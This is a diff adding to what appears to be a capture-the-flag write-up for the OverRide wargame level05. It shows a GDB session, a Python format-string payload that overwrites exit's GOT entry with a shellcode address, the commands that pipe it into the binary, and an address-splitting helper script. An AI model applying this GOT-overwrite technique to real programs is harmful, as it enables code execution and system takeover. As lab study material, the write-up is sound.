@@ -140,13 +140,72 @@ h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
 
 ```
 
+```
+define hook-stop
+   x/10i $eip
+   echo "\n--------------------\n"
+   x/x 0x80497e0
+
+r
+
+=> 0x8048507 <main+195>:	call   0x8048340 <printf@plt>
+   0x804850c <main+200>:	movl   $0x0,(%esp)
+   0x8048513 <main+207>:	call   0x8048370 <exit@plt>
+--------------------
+"0x80497e0 <exit@got.plt>:	0x08048376
+
+ni
+
+--------------------
+"0x80497e0 <exit@got.plt>:	0xffffdd00
+
+```
+
+
+```
+
+#shell = 0xffffdea0
+
+import struct
+
+exit_addr = struct.pack ("I", 0x80497e0)
+exit_addr += struct.pack ("I", 0x80497e0 + 2)
+print exit_addr  + "%56984d%10$n" + "%8543d%11$n"
+
+python /tmp/pyload.py > /tmp/pyload
+level05@OverRide:~$ cat /tmp/pyload
+%56984d%10$n%8543d%11$n
+level05@OverRide:~$ (cat /tmp/pyload; cat) | ./level05 > /dev/null
+```
 
 
 
+```
+shell = 0xabcdef90
 
+addr = 0x12345678
+new_msb = shell & 0xffff
+new_lsb = shell >> 16
 
+print("shell = " + hex(shell))
+print("addr  = " + hex(addr))
 
+print("---------------\n")
 
+masked_addr = addr & 0xffff
+new_addr = masked_addr | (new_lsb << 16)
+
+print("masked = " + hex(masked_addr))
+print("new    = " + hex(new_addr))
+
+print("----------------\n")
+
+masked_addr = new_addr & 0xFFFF0000
+new_addr = masked_addr | new_msb
+
+print("masked = " + hex(masked_addr))
+print("new    = " + hex(new_addr))
+```
 
 
 
